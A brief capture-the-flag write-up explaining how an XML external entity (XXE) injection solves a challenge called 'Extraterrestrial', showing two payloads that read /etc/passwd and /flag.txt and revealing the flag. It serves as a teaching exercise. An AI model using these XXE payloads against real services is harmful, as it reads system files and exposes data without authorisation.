# Extraterrestrial

Points : 125

## Solution

Since the title hints at XXE, we can try injecting a payload into the textbox. This is resource cam ein handy : <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection>. We can first try to read data from /etc/passwd using the following payload :

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

Since that works, I just assumed there would be a flag.txt file in the root directory and I tried reading it using this payload and voila!

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root>&test;</root>
```

Flag : `flag{extraterrestrial_extra_entities}`
